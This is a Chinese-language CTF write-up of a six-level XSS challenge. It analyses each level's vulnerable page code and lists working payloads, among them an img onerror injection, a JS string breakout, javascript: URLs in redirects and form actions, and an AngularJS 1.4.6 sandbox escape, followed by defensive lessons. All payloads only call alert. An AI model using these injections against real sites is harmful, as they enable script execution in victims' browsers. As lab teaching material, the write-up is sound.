---
title: "XSS闯关"
date: 2026-07-15
categories:
  - CTF
  - WEB
tags:
  - CTF
  - XSS
  - AngularJS
---

# 1. 题目分析

## 初始访问

- **URL**: `https://xxxxxxxx.http-ctf2.dasctf.com/`
- **题目名称**: XSS闯关
- **题目描述**: 闯关形式，每过一关进入下一关，目标是在每个页面执行 `alert()` 函数

## HTTP 响应头关键信息

所有请求使用 `curl -s -i` 获取（`-i` 参数打印 HTTP 响应头，否则只输出 body，响应头信息会被遗漏）。

```bash
curl -s -i "http://TARGET/level1?username=xss"
```

Level 1 的响应头：

```
HTTP/2 200
server: openresty
x-powered-by: Express
x-xss-protection: 0          ← 仅 Level 1 出现
set-cookie: connect.sid=...
```

| 响应头 | 值 | 说明 |
|--------|-----|------|
| `Server` | `openresty` | Nginx 系 Web 服务器 |
| `X-Powered-By` | `Express` | **Node.js 后端**（非 PHP） |
| `Set-Cookie` | `connect.sid=...` | Express 会话 Cookie，说明有服务端 Session 机制 |

> `X-XSS-Protection: 0` 仅在 Level 1 出现（其他关没有），是题目作者给出的**提示信号**而非关卡通过的必要条件——Level 1 的注入本身无任何服务端过滤，浏览器 XSS 过滤器开或关都不影响攻击成功。

## 首页分析

首页使用 **百度 amis** 低代码框架渲染，包含三个按钮：
- 「使用说明」：弹出提示"本环境为闯关形式，每过一关即可进入下一关"
- 「点我开始」：跳转 `/level1?username=xss`
- 「重置游戏」：POST `/resetGame`

**关键线索**：点击「点我开始」跳转到 `/level1?username=xss`，暗示 `username` 是注入点。

# 2. 信息收集

## 2.1 核心机制发现：main.js

```bash
curl -s "http://TARGET/main.js"
```

```javascript
_alert = alert;
alert = function(info){
    _alert("过关成功！进入下一关！");
    var current_level = location.pathname.match(/level([0-9]+)/)[1];
    var next_level = parseInt(current_level) + 1;
    location.href = "/level" + next_level;
}
```

> **关键发现**：`alert()` 函数被重写！调用它会自动弹出"过关成功"并跳转下一关。整个闯关机制是**纯前端判断**。

## 2.2 关卡枚举

```bash
for lv in 1 2 3 4 5 6 7 8 9 10; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://TARGET/level${lv}")
  echo "level${lv}: $code"
done
```

结果：Level 1-7 返回 200，Level 8-10 返回 3 bytes（空响应）。共 **6 个有效关卡**，第 7 关显示 flag。

## 2.3 逐关源码分析

各关的注入模式通过逐关访问并分析内联 `<script>` 代码获得：

```bash
curl -s "http://TARGET/level1?username=test"
curl -s "http://TARGET/level2?username=test"
# ... level3-6
```

# 3. 漏洞分析

## Level 1：基础反射型 XSS

**源码逻辑**：
- `username` 参数通过 amis 模板引擎直接回显到页面 HTML 中
- 注意到 Level 1 响应头包含 `X-XSS-Protection: 0`（通过 `curl -i` 发现，仅此关有，其他关无）

**推理链**：

```
线索 1：X-XSS-Protection: 0（通过 curl -i 看到）→ 题目作者明确放行 XSS
线索 2：username 直接回显到 HTML → 典型反射型注入点
  ↓
假设：无过滤的反射型 XSS
  ↓
验证：curl "?username=<img src=x onerror=alert(1)>"
  ↓
结果：HTML 源码中出现 <img src=x onerror=alert(1)>，未做任何 HTML 实体编码
  ↓
结论：Level 1 无任何过滤 ✅
```

> `X-XSS-Protection: 0` 是**提示信号**而非通过条件。即使浏览器 XSS 过滤器开启，此题注入本身没有任何服务端防护，攻击依然会成功。这个头字段更多是题目作者留给解题者的「欢迎来到 XSS 关卡」的暗示。

**注意**：`<script>` 标签通过 innerHTML 方式注入不会执行，需使用事件触发型标签。

## Level 2：JS 字符串注入（escape 防御）

**源码逻辑**：

```javascript
var username = 'USER_INPUT';  // 服务端直接注入到 JS 字符串
document.getElementById('ccc').innerHTML = "Welcome " + escape(username);
```

**推理链**：

```
线索：username 注入到 JS 字符串 var username = '...' 中
  ↓
假设：可以用 ' 闭合字符串，注入任意 JS 代码
  ↓
验证：curl "?username=';alert(1);//"
  ↓
结果：var username = '';alert(1);//'; — 成功注入！
  ↓
结论：没有任何过滤/转义 ✅
```

`escape()` 函数只对 innerHTML 中的内容做 URL 编码，不影响 JS 代码执行。

## Level 3：JS 字符串 → innerHTML（无 escape）

**源码逻辑**：

```javascript
var username = 'USER_INPUT';  // 注入到 JS 字符串
document.getElementById('ccc').innerHTML = "Welcome " + username;
// 没有 escape() 包裹！
```

**推理链**：

```
线索：与 Level 2 相同结构，但去掉了 escape()
  ↓
假设：HTML 标签会被直接渲染
  ↓
验证：curl "?username=<img src=x onerror=alert(1)>"
  ↓
结果：HTML 源码为 var username = '<img src=x onerror=alert(1)>';
       innerHTML 会直接渲染 img 标签
  ↓
结论：HTML 注入可行 ✅
```

## Level 4：javascript: 伪协议注入

**源码逻辑**：

```javascript
var jumpUrl;
if(getQueryVariable('jumpUrl') == false){
    jumpUrl = location.href;  // 默认跳转到当前页
}else{
    jumpUrl = getQueryVariable('jumpUrl');  // 来自 URL 参数
}
// 10 秒倒计时后执行 location.href = jumpUrl
```

**推理链**：

```
线索：jumpUrl 参数直接赋值给 location.href
  ↓
假设：注入 javascript: 伪协议执行 JS
  ↓
验证：curl "?jumpUrl=javascript:alert(1)"
  ↓
结果：getQueryVariable('jumpUrl') 返回原始值 javascript:alert(1)
  ↓
结论：可通过 javascript: 伪协议执行 JS ✅
```

`escape(jumpUrl)` 仅用于页面显示文本，不影响 `location.href` 的实际值。

## Level 5：表单 Action 劫持

**源码逻辑**：

```javascript
if(getQueryVariable('autosubmit') !== false){
    var autoForm = document.getElementById('autoForm');
    autoForm.action = getQueryVariable('action') ? getQueryVariable('action') : location.href;
    autoForm.submit();
}
```

**推理链**：

```
线索 1：存在自动提交的表单
线索 2：action 参数直接赋值给 form.action
  ↓
假设：注入 javascript: 伪协议到 action
  ↓
验证：curl "?autosubmit=1&action=javascript:alert(1)"
  ↓
结果：form.action 被设为 javascript:alert(1)，表单自动提交触发
  ↓
结论：javascript: 伪协议注入 ✅
```

## Level 6：AngularJS 模板注入（SSTI）

**源码分析**：

- 引入了 AngularJS 1.4.6：`<script src="https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js"></script>`
- `ng-app=""` 启用了 Angular 应用（空模块）
- `username` 回显在 Angular 作用域内：`<span>welcome {{username}}</span>`

**推理链**：

```
线索 1：AngularJS 1.4.6 + ng-app 启用
线索 2：username 在 Angular 作用域内回显
  ↓
假设：Angular 表达式注入（Client-Side Template Injection）
  ↓
验证：curl "?username={{7*7}}"
  ↓
结果：HTML 中显示 {{7*7}}（Angular 在浏览器端计算 → 49）
  ↓
结论：AngularJS SSTI 确认 ✅
```

**AngularJS 沙箱逃逸原理**：

AngularJS 1.4.6 使用沙箱限制表达式中的危险操作。可通过 `constructor` 属性链绕过：

```
{{constructor.constructor('alert(1)')()}}
```

- `constructor` → 获取当前对象的构造函数（Object）
- `.constructor` → 获取 Object 的构造函数（Function）
- `('alert(1)')()` → 调用 Function 构造器创建并执行代码

# 4. 漏洞利用

## Level 1

```
/level1?username=<img src=x onerror=alert(1)>
```

访问即触发，`alert()` 被重写 → 自动跳转 Level 2。

## Level 2

```
/level2?username=';alert(1);//
```

闭合 JS 字符串 → 执行 alert → 跳转 Level 3。

## Level 3

```
/level3?username=<img src=x onerror=alert(1)>
```

innerHTML 渲染 img → onerror 触发 alert → 跳转 Level 4。

## Level 4

```
/level4?jumpUrl=javascript:alert(1)
```

等待 10 秒倒计时结束（或修改 `time` 参数加速），`location.href = jumpUrl` 触发 javascript: 伪协议 → alert → 跳转 Level 5。

## Level 5

```
/level5?autosubmit=1&action=javascript:alert(1)
```

表单自动提交 → action 为 javascript: 伪协议 → alert → 跳转 Level 6。

## Level 6

```
/level6?username={{constructor.constructor('alert(1)')()}}
```

AngularJS 解析表达式 → 执行 alert → 跳转 Level 7。

## 获取 Flag

```
/level7
```

```
you win! </br>
here is your flag : n1book{xss_is_so_interesting}
```

# 5. Flag

```
n1book{xss_is_so_interesting}
```

# 6. 知识点总结

| 关卡 | XSS 类型 | 关键技术点 |
|------|---------|-----------|
| Level 1 | 反射型 XSS | HTML 上下文注入，事件触发型标签 vs script 标签 |
| Level 2 | DOM 型 XSS | JS 字符串注入，`escape()` 只防 innerHTML 不防 JS 注入 |
| Level 3 | DOM 型 XSS | innerHTML 直接拼接，无 sanitization |
| Level 4 | javascript: 伪协议 | URL 重定向中的 JS 执行，`escape()` 仅用于展示 |
| Level 5 | 表单劫持 | Form action 伪协议注入，自动提交触发 |
| Level 6 | AngularJS SSTI | 客户端模板注入 + 沙箱逃逸（constructor 链） |

**核心教训**：
1. **XSS 防御需要分层**：HTML 编码、JS 编码、URL 编码各司其职
2. **`escape()` ≠ 安全**：JS 的 `escape()` 是 URL 编码，不防 XSS
3. **innerHTML 是雷区**：永远不要将用户输入直接拼接到 innerHTML
4. **javascript: 伪协议是经典攻击面**：URL 跳转必须白名单校验
5. **前端框架也有 SSTI**：AngularJS/React/Vue 的模板注入与后端 SSTI 同源

**修复建议**：
- 使用 `textContent` 替代 `innerHTML`
- URL 跳转前校验协议（仅允许 `http:`/`https:`）
- JS 上下文中对引号做转义（`\'`）
- 升级 AngularJS 或使用 CSP（Content Security Policy）

# 7. 解题链路总结图

```
curl -s -i TARGET/
    ↓ Server: openresty / X-Powered-By: Express
判断环境：Node.js + Nginx
    ↓
分析首页 → 找到 /level1?username=xss
    ↓
curl /main.js → 发现 alert() 被重写（闯关机制）
    ↓
逐关分析源码：

Level 1: username → HTML（无过滤）
    → <img src=x onerror=alert(1)>

Level 2: username → JS var '...'（无转义）→ escape() → innerHTML
    → ';alert(1);//

Level 3: username → JS var '...'（无转义）→ innerHTML（无 escape）
    → <img src=x onerror=alert(1)>

Level 4: jumpUrl → location.href（无校验）
    → ?jumpUrl=javascript:alert(1)

Level 5: action → form.action（无校验）+ autosubmit → submit()
    → ?autosubmit=1&action=javascript:alert(1)

Level 6: AngularJS 1.4.6 + ng-app + username 回显
    → {{constructor.constructor('alert(1)')()}}

    ↓ 全部通过后

Level 7 → n1book{xss_is_so_interesting}
```
